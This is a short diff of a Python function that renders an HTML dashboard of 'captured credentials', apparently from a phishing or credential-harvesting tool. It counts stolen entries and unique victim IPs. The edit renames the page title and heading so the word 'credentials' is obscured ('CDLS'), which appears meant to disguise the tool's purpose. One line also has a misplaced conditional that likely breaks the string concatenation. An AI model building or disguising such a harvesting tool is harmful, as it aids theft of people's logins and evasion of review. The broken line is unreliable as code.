@@ -328,7 +328,7 @@ def view_creds_html():
     <html>
     <head>
         <meta charset="UTF-8">
-        <title>Captured Credentials</title>
+        <title>Captured </title>
         <style>
             body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
             h1 { color: #ff4444; }
@@ -342,7 +342,7 @@ def view_creds_html():
         </style>
     </head>
     <body>
-        <h1>🔴 CAPTURED CREDENTIALS</h1>
+        <h1>🔴 CAPTURED CDLS</h1>
         <div class="stats">
             <div class="stat-box"><div class="num">""" + str(len(structured)) + """</div><div>Total</div></div>
             <div class="stat-box"><div class="num">""" + str(len(set([e['ip'] for e in structured]))) if structured else '0' + """</div><div>Unique IPs</div></div>
